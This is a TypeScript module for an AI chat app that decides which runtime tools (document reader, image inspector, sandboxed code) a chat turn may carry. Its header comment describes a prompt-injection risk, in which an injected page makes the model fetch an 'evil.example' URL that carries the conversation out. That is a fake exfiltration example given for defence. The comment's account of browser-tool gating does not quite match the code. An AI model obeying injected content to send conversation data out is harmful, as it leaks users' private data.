/**
 * Which of Juno's own runtime tools a chat turn may carry.
 *
 * Pure, so the rule can be tested without a request: the failure it guards
 * against was invisible for exactly that reason. `openUnifiedAgentToolset`
 * treats an *absent* allowlist as "every registered tool", and the chat route
 * never passed one — so `browser_agent` rode along on every saved turn, on
 * every model, with no toggle. Its risk class is `read_only`, which the
 * approval broker auto-allows, so a prompt-injected connector result or page
 * could tell the model to fetch `https://evil.example/?d=<conversation>` and
 * nothing but the untrusted-content rule stood in the way.
 *
 * The rule now: a runtime tool is attached only when the user explicitly
 * switched on the feature that needs it, or when the turn is carrying the
 * thing the tool acts on. Web browsing rides the existing `webSearch` toggle —
 * the same toggle that already adds the untrusted-content rule to the system
 * prompt, so the envelope the browser tool writes always has a rule that reads
 * it. The two attachment tools ride the attachments themselves, which is a
 * stricter condition than a toggle rather than a looser one: they can only
 * reach files the person put in this conversation, so a turn with no
 * attachments has nothing to offer them and does not carry them.
 *
 * `start_task` is not on this list, because it is not a registry tool. It is a
 * native tool the chat route builds per turn (`NativeChatTool` in llm.ts) and
 * gates with `chatTaskToolEnabled` in src/lib/chat/task-tool.ts, so it never
 * passes through the registry's generic approval broker.
 */

/** Registry id of the hosted page-reading tool (`src/lib/agent/browser.ts`). */
export const BROWSER_TOOL_ID = "browser_agent";

/** Registry id of the attached-document reader (`src/lib/agent/document.ts`). */
export const READ_DOCUMENT_TOOL_ID = "read_document";

/** Registry id of the crop-and-magnify tool (`src/lib/agent/image.ts`). */
export const INSPECT_IMAGE_TOOL_ID = "inspect_image";

/** Registry id of the sandboxed Python tool (`src/lib/agent/code.ts`). */
export const CODE_INTERPRETER_TOOL_ID = "code_interpreter";
export const RUN_CODE_TOOL_ID = "run_code";

/** An explicit empty allowlist: no runtime tool at all. */
export const NO_RUNTIME_TOOLS: readonly string[] = Object.freeze([]);

export interface RuntimeToolToggles {
  /** Read for the skill layer's grant; it attaches no runtime tool (see the header). */
  webSearch: boolean;
  /**
   * This turn's history carries at least one indexed document.
   *
   * Not "an attachment exists": a file still being parsed has nothing for the
   * reader to read, and offering a tool that can only answer "not indexed yet"
   * invites the model to spend a round discovering that.
   */
  documents?: boolean;
  /**
   * There is a picture worth looking closer at, AND the model can see.
   *
   * Both halves matter. A model with no vision cannot use a crop, so handing
   * it the tool only produces a tool call whose result it must be told to
   * ignore — which is a worse outcome than never offering it.
   */
  images?: boolean;
  /**
   * A file is attached AND a remote sandbox exists to run code against it AND
   * the turn is entitled to an execution tool — above all, the model's tool
   * calling has been VERIFIED by the round-trip probe (src/lib/tools/
   * entitlements.ts decides; the route passes the verdict here).
   *
   * The sandbox half is a safety condition rather than a convenience: with no
   * sandbox configured the only backend available is a child process on this
   * host, which must never run model-written code. The tool is simply not
   * offered instead, and the turn is told plainly that code cannot run.
   */
  code?: boolean;
}

/**
 * The runtime tools a chat turn may expose, from the request's feature toggles.
 * Always an array — never `undefined` — because `undefined` means "everything"
 * one layer down.
 */
export function chatRuntimeToolAllowlist(toggles: RuntimeToolToggles): string[] {
  const allowed: string[] = [];
  if (toggles.documents) allowed.push(READ_DOCUMENT_TOOL_ID);
  if (toggles.images) allowed.push(INSPECT_IMAGE_TOOL_ID);
  if (toggles.code) allowed.push(CODE_INTERPRETER_TOOL_ID);
  return allowed;
}
